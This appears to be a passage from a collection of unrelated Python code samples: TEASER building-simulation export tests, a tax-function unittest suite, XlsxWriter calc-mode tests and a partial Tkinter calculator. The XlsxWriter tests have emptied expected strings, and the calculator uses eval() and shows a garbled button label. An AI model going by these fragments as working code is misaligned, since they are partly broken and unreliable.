construction=\"heavy\"\n            )\n\n            out_wall.area = value[0]\n            out_wall.tilt = value[1]\n            out_wall.orientation = value[2]\n\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 3\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 3\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = True\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = True\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 3\n        prj.merge_windows_calc = True\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = True\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n    def test_export_only_win(self):\n        \"\"\"\n        Tests AixLib output for a building with windows only\n        \"\"\"\n\n        from teaser.logic.buildingobjects.building import Building\n\n        bldg = Building(parent=prj)\n        bldg.name = \"SuperExampleBuilding\"\n        bldg.street_name = \"AwesomeAvenue42\"\n        bldg.city = \"46325FantasticTown\"\n        bldg.year_of_construction = 2015\n        bldg.number_of_floors = 1\n        bldg.height_of_floors = 3.5\n\n        from teaser.logic.buildingobjects.thermalzone import ThermalZone\n\n        tz = ThermalZone(parent=bldg)\n        tz.name = \"LivingRoom\"\n        tz.area = 140.0\n        tz.volume = tz.area * bldg.number_of_floors * bldg.height_of_floors\n        tz.infiltration_rate = 0.5\n\n        from teaser.logic.buildingobjects.useconditions import UseConditions\n\n        tz.use_conditions = UseConditions(parent=tz)\n        tz.use_conditions.load_use_conditions(\"Living\", prj.data)\n\n        from teaser.logic.buildingobjects.buildingphysics.window import Window\n        from teaser.logic.buildingobjects.buildingphysics.layer import Layer\n        from teaser.logic.buildingobjects.buildingphysics.material import Material\n\n        win_dict = {\n            \"Window_east\": [5.0, 90.0, 90.0],\n            \"Window_south\": [8.0, 90.0, 180.0],\n            \"Window_west\": [5.0, 90.0, 270.0],\n        }\n\n        for key, value in win_dict.items():\n\n            win = Window(parent=tz)\n            win.name = key\n            win.area = value[0]\n            win.tilt = value[1]\n            win.orientation = value[2]\n\n            win.inner_convection = 1.7\n            win.inner_radiation = 5.0\n            win.outer_convection = 20.0\n            win.outer_radiation = 5.0\n            win.g_value = 0.789\n            win.a_conv = 0.03\n            win.shading_g_total = 0.0\n            win.shading_max_irr = 180.0\n\n            win_layer = Layer(parent=win)\n            win_layer.id = 1\n            win_layer.thickness = 0.024\n\n            win_material = Material(win_layer)\n            win_material.name = \"GlasWindow\"\n            win_material.thermal_conduc = 0.067\n            win_material.transmittance = 0.9\n\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 3\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 3\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = True\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = True\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 3\n        prj.merge_windows_calc = True\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = True\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n    def test_export_only_rt(self):\n        \"\"\"\n        Tests AixLib output for a building with rooftops only\n        \"\"\"\n\n        from teaser.logic.buildingobjects.building import Building\n\n        bldg = Building(parent=prj)\n        bldg.name = \"SuperExampleBuilding\"\n        bldg.street_name = \"AwesomeAvenue42\"\n        bldg.city = \"46325FantasticTown\"\n        bldg.year_of_construction = 2015\n        bldg.number_of_floors = 1\n        bldg.height_of_floors = 3.5\n\n        from teaser.logic.buildingobjects.thermalzone import ThermalZone\n\n        tz = ThermalZone(parent=bldg)\n        tz.name = \"LivingRoom\"\n        tz.area = 140.0\n        tz.volume = tz.area * bldg.number_of_floors * bldg.height_of_floors\n        tz.infiltration_rate = 0.5\n\n        from teaser.logic.buildingobjects.useconditions import UseConditions\n\n        tz.use_conditions = UseConditions(parent=tz)\n        tz.use_conditions.load_use_conditions(\"Living\", prj.data)\n\n        from teaser.logic.buildingobjects.buildingphysics.rooftop import Rooftop\n\n        roof_south = Rooftop(parent=tz)\n        roof_south.name = \"Roof_South\"\n        roof_south.area = 75.0\n        roof_south.orientation = 180.0\n        roof_south.tilt = 55.0\n        roof_south.inner_convection = 1.7\n        roof_south.outer_convection = 20.0\n        roof_south.inner_radiation = 5.0\n        roof_south.outer_radiation = 5.0\n\n        roof_north = Rooftop(parent=tz)\n        roof_north.name = \"Roof_North\"\n        roof_north.area = 75.0\n        roof_north.orientation = 0.0\n        roof_north.tilt = 55.0\n        roof_north.inner_convection = 1.7\n        roof_north.outer_convection = 20.0\n        roof_north.inner_radiation = 5.0\n        roof_north.outer_radiation = 5.0\n\n        from teaser.logic.buildingobjects.buildingphysics.layer import Layer\n\n        layer_s1 = Layer(parent=roof_south, id=0)\n        layer_s1.thickness = 0.3\n\n        from teaser.logic.buildingobjects.buildingphysics.material import Material\n\n        material_s1 = Material(layer_s1)\n        material_s1.name = \"Insulation\"\n        material_s1.density = 120.0\n        material_s1.heat_capac = 0.04\n        material_s1.thermal_conduc = 1.0\n\n        layer_s2 = Layer(parent=roof_south, id=1)\n        layer_s2.thickness = 0.15\n\n        material_s2 = Material(layer_s2)\n        material_s2.name = \"Tile\"\n        material_s2.density = 1400.0\n        material_s2.heat_capac = 0.6\n        material_s2.thermal_conduc = 2.5\n\n        layer_n1 = Layer(parent=roof_north, id=0)\n        layer_n1.thickness = 0.3\n\n        material_n1 = Material(layer_n1)\n        material_n1.name = \"Insulation\"\n        material_n1.density = 120.0\n        material_n1.heat_capac = 0.04\n        material_n1.thermal_conduc = 1.0\n\n        layer_n2 = Layer(parent=roof_north, id=1)\n        layer_n2.thickness = 0.15\n\n        material_n2 = Material(layer_n2)\n        material_n2.name = \"Tile\"\n        material_n2.density = 1400.0\n        material_n2.heat_capac = 0.6\n        material_n2.thermal_conduc = 2.5\n\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 3\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 3\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n    def test_export_only_gf(self):\n        \"\"\"\n        Tests AixLib output for a building with ground floors only\n        \"\"\"\n\n        from teaser.logic.buildingobjects.building import Building\n\n        bldg = Building(parent=prj)\n        bldg.name = \"SuperExampleBuilding\"\n        bldg.street_name = \"AwesomeAvenue42\"\n        bldg.city = \"46325FantasticTown\"\n        bldg.year_of_construction = 2015\n        bldg.number_of_floors = 1\n        bldg.height_of_floors = 3.5\n\n        from teaser.logic.buildingobjects.thermalzone import ThermalZone\n\n        tz = ThermalZone(parent=bldg)\n        tz.name = \"LivingRoom\"\n        tz.area = 140.0\n        tz.volume = tz.area * bldg.number_of_floors * bldg.height_of_floors\n        tz.infiltration_rate = 0.5\n\n        from teaser.logic.buildingobjects.useconditions import UseConditions\n\n        tz.use_conditions = UseConditions(parent=tz)\n        tz.use_conditions.load_use_conditions(\"Living\", prj.data)\n\n        from teaser.logic.buildingobjects.buildingphysics.groundfloor import GroundFloor\n\n        ground_floor_dict = {\"GroundFloor\": [100.0, 0.0, -2]}\n\n        for key, value in ground_floor_dict.items():\n\n            ground = GroundFloor(parent=tz)\n            ground.name = key\n            ground.load_type_element(\n                year=bldg.year_of_construction, construction=\"heavy\"\n            )\n            ground.area = value[0]\n            ground.tilt = value[1]\n            ground.orientation = value[2]\n\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 3\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"AixLib\"\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n\n        prj.number_of_elements_calc = 1\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 2\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 3\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n        prj.number_of_elements_calc = 4\n        prj.merge_windows_calc = False\n        prj.used_library_calc = \"IBPSA\"\n        prj.calc_all_buildings()\n        prj.export_ibpsa()\n\n    def test_ashrae_140_600(self):\n\n        from teaser.examples.verification.verification_ASHRAE_140_600 import (\n            main as exmain,\n        )\n\n        exmain(number_of_elements=1)\n        exmain(number_of_elements=2)\n        exmain(number_of_elements=3)\n        exmain(number_of_elements=4)\n\n    def test_ashrae_140_620(self):\n\n        from teaser.examples.verification.verification_ASHRAE_140_620 import (\n            main as exmain,\n        )\n\n        exmain(number_of_elements=1)\n        exmain(number_of_elements=2)\n        exmain(number_of_elements=3)\n        exmain(number_of_elements=4)\n\n    def test_ashrae_140_900(self):\n\n        from teaser.examples.verification.verification_ASHRAE_140_900 import (\n            main as exmain,\n        )\n\n        exmain(number_of_elements=1)\n        exmain(number_of_elements=2)\n        exmain(number_of_elements=3)\n        exmain(number_of_elements=4)\n\n    def test_ashrae_140_920(self):\n\n        from teaser.examples.verification.verification_ASHRAE_140_920 import (\n            main as exmain,\n        )\n\n        exmain(number_of_elements=1)\n        exmain(number_of_elements=2)\n        exmain(number_of_elements=3)\n        exmain(number_of_elements=4)\n\n    # def test_type_bldg_residential_profiles(self):\n    #     \"\"\"\n    #     Verification of the type building generation of an office building.\n    #     Values are compared with TEASER3 values.\n    #     \"\"\"\n    #     from teaser.logic.archetypebuildings.bmvbs.singlefamilydwelling \\\n    #         import SingleFamilyDwelling\n    #\n    #     prj.set_default()\n    #     test_residential = SingleFamilyDwelling(parent=prj,\n    #                                             name=\"TestBuilding\",\n    #                                             year_of_construction=1988,\n    #                                             number_of_floors=3,\n    #                                             height_of_floors=3,\n    #                                             net_leased_area=2500)\n    #\n    #     test_residential.generate_archetype()\n    #\n    #     prj.calc_all_buildings()\n    #\n    #     path_to_export = prj.export_aixlib(\n    #         internal_id=None,\n    #         path=None)\n    #\n    #     from scipy.io import loadmat\n    #     file = loadmat(os.path.join(\n    #         path_to_export,\n    #         \"TestBuilding\",\n    #         \"InternalGains_TestBuilding.mat\"))\n    #\n    #     use_cond = test_residential.thermal_zones[0].use_conditions\n    #\n    #     assert (file['Internals'].transpose()[1][1:] ==\n    #             use_cond.profile_persons).all()\n    #\n    #     assert (file['Internals'].transpose()[2][1:] ==\n    #             use_cond.profile_machines).all()\n    #\n    #     assert (file['Internals'].transpose()[3][1:] ==\n    #             use_cond.profile_lighting).all()\n\n    def test_ahu_profiles(self):\n        \"\"\"Test setting AHU profiles of different lengths\n\n        Related to issue 553 at https://github.com/RWTH-EBC/TEASER/issues/553\n        \"\"\"\n\n        prj_test = Project(load_data=True)\n        prj_test.name = \"TestAHUProfiles\"\n\n        prj_test.add_non_residential(\n            method=\"bmvbs\",\n            usage=\"office\",\n            name=\"OfficeBuilding\",\n            year_of_construction=2015,\n            number_of_floors=4,\n            height_of_floors=3.5,\n            net_leased_area=1000.0,\n        )\n\n        prj_test.used_library_calc = \"AixLib\"\n        prj_test.number_of_elements_calc = 2\n\n        v_flow_workday = [\n            0.0,\n            0.0,\n            0.0,\n            0.0,\n            0.0,\n            0.0,\n            1.0,\n            1.0,\n            1.0,\n            1.0,\n            1.0,\n            1.0,\n            1.0,\n            1.0,\n            1.0,\n            1.0,\n            1.0,\n            1.0,\n            0.0,\n            0.0,\n            0.0,\n            0.0,\n            0.0,\n            0.0,\n            0.0,\n        ]\n\n        v_flow_week = []\n        for day in range(7):\n            for val in v_flow_workday:\n                if day < 5:\n                    ratio = val\n                else:\n                    if val == 1:\n                        ratio = 0.2\n                    else:\n                        ratio = 0.0\n                v_flow_week.append(ratio)\n\n        prj_test.buildings[-1].central_ahu.profile_v_flow = v_flow_week\n\n        assert prj_test.buildings[-1].central_ahu.profile_v_flow == v_flow_week\n\n    def test_export_bldg_threshold(self):\n\n        prj.set_default(load_data=True)\n\n        prj.add_non_residential(\n            method=\"bmvbs\",\n            usage=\"institute\",\n            name=\"TestBuilding\",\n            year_of_construction=1988,\n            number_of_floors=7,\n            height_of_floors=1,\n            net_leased_area=1988,\n            with_ahu=True,\n            office_layout=0,\n            window_layout=0,\n            construction_type=\"heavy\",\n        )\n        prj.buildings[-1].thermal_zones[0].use_conditions.with_ahu = True\n        prj.buildings[-1].thermal_zones[0].use_conditions.with_ideal_thresholds = True\n        prj.buildings[-1].thermal_zones[1].use_conditions.with_ahu = False\n        prj.buildings[-1].thermal_zones[1].use_conditions.with_ideal_thresholds = False\n        prj.buildings[-1].thermal_zones[-1].use_conditions.with_ahu = True\n        prj.buildings[-1].thermal_zones[-1].use_conditions.with_ideal_thresholds = True\n        prj.calc_all_buildings()\n        prj.export_aixlib()\n", "403": "import unittest\nfrom tax import calc_tax\n\n\nclass TestTax(unittest.TestCase):\n\n    def test_calc_tax_negative_age_should_raise_error(self):\n        self.assertRaises(ValueError, calc_tax, 60000, 0.20, -10)\n\n    def test_calc_tax_negative_tax_rate_should_raise_error(self):\n        self.assertRaises(ValueError, calc_tax, 60000, -0.20, 10)\n\n    def test_calc_tax_negative_amount_should_raise_error(self):\n        self.assertRaises(ValueError, calc_tax, -60000, 0.20, 10)\n\n    def test_calc_tax_incorrect_age_type(self):\n        self.assertRaises(TypeError, calc_tax, 60000, 0.20, '10')\n\n    def test_calc_tax_incorrect_amount_type(self):\n        self.assertRaises(TypeError, calc_tax, '60000', 0.20, 10)\n\n    def test_calc_tax_incorrect_tax_rate_type(self):\n        self.assertRaises(TypeError, calc_tax, 60000, '0.20', 10)\n\n    def test_calc_tax(self):\n        self.assertEqual(calc_tax(60000, 0.20, 10), 5000)\n        self.assertAlmostEqual(calc_tax(60000, 0.20, 10), 5000)\n\n    def test_calc_tax_eighteen_age_and_below(self):\n        self.assertEqual(calc_tax(60000, 0.2, 18), 5000)\n        self.assertEqual(calc_tax(25000, 0.2, 18), 5000)\n        self.assertLessEqual(calc_tax(20000, 0.2, 18), 5000)\n\n    def test_calc_tax_sixty_five_age_above(self):\n        self.assertEqual(calc_tax(60000, 0.20, 66), 8000)\n        self.assertEqual(calc_tax(60000, 0.20, 65), 12000)\n        self.assertLessEqual(calc_tax(35000, 0.20, 65), 12000)\n\n    def test_calc_tax_between_18_and_65_age(self):\n        self.assertEqual(calc_tax(60000, 0.2, 30), 12000)\n        self.assertGreaterEqual(calc_tax(60000, 0.2, 30), 5000)\n        self.assertGreaterEqual(calc_tax(60000, 0.2, 30), 8000)", "404": "###############################################################################\n#\n# Tests for XlsxWriter.\n#\n# Copyright (c), 2013-2020, John McNamara, jmcnamara@cpan.org\n#\n\nimport unittest\nfrom ...compatibility import StringIO\nfrom ...workbook import Workbook\n\n\nclass TestWriteCalcPr(unittest.TestCase):\n    \"\"\"\n    Test the Workbook _write_calc_pr() method.\n\n    \"\"\"\n\n    def setUp(self):\n        self.fh = StringIO()\n        self.workbook = Workbook()\n        self.workbook._set_filehandle(self.fh)\n\n    def test_write_calc_pr(self):\n        \"\"\"Test the _write_calc_pr() method.\"\"\"\n\n        self.workbook._write_calc_pr()\n\n        exp = \"\"\"\"\"\"\n        got = self.fh.getvalue()\n\n        self.assertEqual(got, exp)\n\n    def test_calc_mode_auto_except_tables(self):\n        \"\"\"\n        Test the _write_calc_pr() method with the calculation mode set\n        to auto_except_tables.\n\n        \"\"\"\n\n        self.workbook.set_calc_mode(\"auto_except_tables\")\n        self.workbook._write_calc_pr()\n\n        exp = \"\"\"\"\"\"\n        got = self.fh.getvalue()\n\n        self.assertEqual(got, exp)\n\n    def test_calc_mode_manual(self):\n        \"\"\"\n        Test the _write_calc_pr() method with the calculation mode set to\n        manual.\n\n        \"\"\"\n\n        self.workbook.set_calc_mode(\"manual\")\n        self.workbook._write_calc_pr()\n\n        exp = \"\"\"\"\"\"\n        got = self.fh.getvalue()\n\n        self.assertEqual(got, exp)\n\n    def test_write_calc_pr(self):\n        \"\"\"Test the _write_calc_pr() method with non-default calc id.\"\"\"\n\n        self.workbook.set_calc_mode(\"auto\", 12345)\n        self.workbook._write_calc_pr()\n\n        exp = \"\"\"\"\"\"\n        got = self.fh.getvalue()\n\n        self.assertEqual(got, exp)\n\n    def tearDown(self):\n        self.workbook.fileclosed = 1\n", "405": "#By: WENDEL CABRAL\r\n\r\n#IMPORTS\r\nfrom tkinter import *\r\nimport keyboard\r\nimport string\r\nfrom threading import *\r\nimport math\r\n\r\n#Criando TK Travando Janela\r\napp = Tk()\r\napp.title(\"Calculadora\")\r\napp.resizable(width=False, height=False)\r\n\r\n#CRIANDO VISOR (TELA)\r\nfVisor = Frame(app)\r\nfVisor.pack(side=TOP)\r\nlbVisor = Label(fVisor,text=\"\",width = 28,relief=RIDGE, font=\"Arial 12 bold\", fg=\"blue\")\r\nlbVisor.pack(fill=Y)\r\nlbVisor2 = Label(fVisor,text=\"\",width = 28,relief=RIDGE, font=\"Arial 12 bold\", fg=\"red\")\r\nlbVisor2.pack(fill=Y)\r\n\r\n\r\n#CRIANDO BOTOES (TAMANHOS)\r\nfButton = Frame(app)\r\nfButton.pack(side=TOP)\r\nbt0 = Button(fButton,text=\"0\" ,bd=5,padx=1,pady=1, width=8, height=2)\r\nbt1 = Button(fButton,text=\"1\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbt2 = Button(fButton,text=\"2\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbt3 = Button(fButton,text=\"3\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbt4 = Button(fButton,text=\"4\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbt5 = Button(fButton,text=\"5\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbt6 = Button(fButton,text=\"6\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbt7 = Button(fButton,text=\"7\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbt8 = Button(fButton,text=\"8\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbt9 = Button(fButton,text=\"9\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbtSoma = Button(fButton,text=\"+\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbtSubi = Button(fButton,text=\"-\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbtMult = Button(fButton,text=\"x\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbtDiv = Button(fButton,text=\"/\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbtIgual = Button(fButton,text=\"=\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbtPercert = Button(fButton,text=\"%\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbtPonto = Button(fButton,text=\".\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbtLimpa = Button(fButton,text=\"C\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbtApaga = Button(fButton,text=\"<-\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbtRaiz = Button(fButton,text=\"\u00e2\u02c6\u0161x\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbtPoten = Button(fButton,text=\"x^y\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbtFseno = Button(fButton,text=\"sin\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbtFcose = Button(fButton,text=\"cos\",bd=5,padx=1,pady=1, width=8, height=2)\r\nbtFtang = Button(fButton,text=\"tan\",bd=5,padx=1,pady=1, width=8, height=2)\r\n\r\n#Organizando botoes com linhas e colunas no GRID.\r\nbt7.grid(row=0,column=0)\r\nbt8.grid(row=0,column=1)\r\nbt9.grid(row=0,column=2)\r\nbtApaga.grid(row=0,column=3)\r\nbt4.grid(row=1,column=0)\r\nbt5.grid(row=1,column=1)\r\nbt6.grid(row=1,column=2)\r\nbtSoma.grid(row=1,column=3)\r\nbt1.grid(row=2,column=0)\r\nbt2.grid(row=2,column=1)\r\nbt3.grid(row=2,column=2)\r\nbtSubi.grid(row=2,column=3)\r\nbt0.grid(row=3,column=0)\r\nbtPercert.grid(row=3,column=2)\r\nbtPonto.grid(row=3,column=1)\r\nbtDiv.grid(row=3,column=3)\r\nbtPoten.grid(row=4,column=0)\r\nbtFcose.grid(row=4,column=1)\r\nbtFseno.grid(row=4,column=2)\r\nbtFtang.grid(row=4,column=3)\r\nbtRaiz.grid(row=5,column=0)\r\nbtMult.grid(row=5,column=1)\r\nbtLimpa.grid(row=5,column=2)\r\nbtIgual.grid(row=5, column=3)\r\n\r\n#VARIAVEL ONDE VAI FICAR O CALCULO\r\ncalc = \"\"\r\ntemp = \"\"\r\nop = \"\"\r\n\r\n#ENTRADA DE DADOS\r\ndef entrada(rec):\r\n    global calc,lbVisor,temp,op,lbVisor2\r\n    if len(calc) > 1 and calc[1].isdigit():\r\n        calc = calc.lstrip('0')\r\n        lbVisor.config(text=calc)\r\n    #ENTRADA VIA BOTAO\r\n    try:\r\n        if rec.widget==bt0:\r\n            calc+=\"0\"\r\n            lbVisor.config(text=calc)\r\n        elif rec.widget==bt1:\r\n            calc+=\"1\"\r\n            lbVisor.config(text=calc)        \r\n        elif rec.widget==bt2:\r\n            calc+=\"2\"\r\n            lbVisor.config(text=calc)\r\n        elif rec.widget==bt3:\r\n            calc+=\"3\"\r\n            lbVisor.config(text=calc)\r\n        elif rec.widget==bt4:\r\n            calc+=\"4\"\r\n            lbVisor.config(text=calc)\r\n        elif rec.widget==bt5:\r\n            calc+=\"5\"\r\n            lbVisor.config(text=calc)\r\n        elif rec.widget==bt6:\r\n            calc+=\"6\"\r\n            lbVisor.config(text=calc)\r\n        elif rec.widget==bt7:\r\n            calc+=\"7\"\r\n            lbVisor.config(text=calc)\r\n        elif rec.widget==bt8:\r\n            calc+=\"8\"\r\n            lbVisor.config(text=calc)\r\n        elif rec.widget==bt9:\r\n            calc+=\"9\"\r\n            lbVisor.config(text=calc)\r\n        elif rec.widget==btPonto:\r\n            calc+=\".\"\r\n            lbVisor.config(text=calc)\r\n        elif rec.widget==btPercert:\r\n            i=0\r\n            pos=0\r\n            while i < len(calc):\r\n                l = calc[i]\r\n                if (l==\"+\" or (l==\"-\") or (l==\"*\") or (l==\"/\")):\r\n                    pos = i\r\n                i+=1\r\n            op=calc[pos]\r\n            i=0\r\n            nCalc=\"\"\r\n            while i < pos:\r\n                l = calc[i]\r\n                nCalc+=l\r\n                i+=1\r\n            i=0\r\n            pos=pos+1\r\n            rest=\"\"\r\n            while pos < len(calc):\r\n                l = calc[pos]\r\n                rest+=l\r\n                pos+=1\r\n            res = eval(nCalc)  \r\n            if op == \"+\":\r\n                    rs=float(res)/100*float(rest)\r\n                    calc=float(res)+rs\r\n            elif op == \"-\":\r\n                    rs=float(res)/100*float(rest)\r\n                    calc=float(res)-rs\r\n            elif op == \"*\":\r\n                    rs=float(res)/100*float(rest)\r\n                    calc=rs\r\n            elif op == \"/\":\r\n                    rs=float(res)/100*float(rest)\r\n                    calc=float(res)/rs\r\n            calc=str(calc)\r\n            lbVisor2.config(text=calc)\r\n        elif rec.widget==btSoma:\r\n            calc+=\"+\"\r\n            lbVisor.config(text=calc)\r\n        elif rec.widget==btSubi:\r\n            calc+=\"-\"\r\n            lbVisor.config(text=calc)\r\n        elif rec.widget==btMult:\r\n            calc+=\"*\"\r\n            lbVisor.config(text=calc)\r\n        elif rec.widget==btDiv:\r\n            calc+=\"/\"\r\n            lbVisor.config(text=calc)\r\n        elif rec.widget==btRaiz:\r\n            try:\r\n                res = eval(calc)  \r\n                raiz = math.sqrt(res)\r\n                calc = str(raiz)\r\n                lbVisor2.config(text=calc)\r\n            except:\r\n                lbVisor2.config(text=\"erro!\")\r\n        elif rec.widget==btPoten:\r\n            res = eval(calc) \r\n            if temp == \"\":\r\n                temp=res\r\n                temp=str(temp)\r\n                calc=\"\"\r\n                lbVisor.config(text=calc)\r\n                lbVisor2.config(text=temp+\"^\")\r\n            else:\r\n                n1=float(temp)\r\n                n2=float(res)\r\n                calc=(n1 ** n2)\r\n                temp=\"\"\r\n                calc= str(calc)\r\n                lbVisor.config(text=str(res))\r\n                lbVisor2.config(text=calc)\r\n                teste=(2.1 ** 5.1)\r\n                print(teste)\r\n        elif rec.widget==btFseno:\r\n            try:\r\n                res = eval(calc)\r\n                calc= str(res)\r\n                lbVisor.config(text= calc)        \r\n                res=float(res)\r\n                rd = math.radians(res)\r\n                seno= math.sin(rd)\r\n                calc= str(seno)\r\n                lbVisor2.config(text= calc)  \r\n            except:\r\n                lbVisor2.config(text=\"erro!\")\r\n        elif rec.widget==btFcose:\r\n            try:\r\n                res = eval(calc)\r\n                calc= str(res)\r\n                lbVisor.config(text= calc)        \r\n                res=float(res)\r\n                rd = math.radians(res)\r\n                cose= math.cos(rd)\r\n                calc= str(cose)\r\n                lbVisor2.config(text= calc)  \r\n            except:\r\n                lbVisor2.config(text=\"erro!\")\r\n        elif rec.widget==btFtang:\r\n            try:\r\n                res = eval(calc)\r\n                calc= str(res)\r\n                lbVisor.config(text= calc)        \r\n                res=float(res)\r\n                rd = math.radians(res)\r\n                tam= math.tan(rd)\r\n                calc= str(tam)\r\n                lbVisor2.config(text= calc)  \r\n            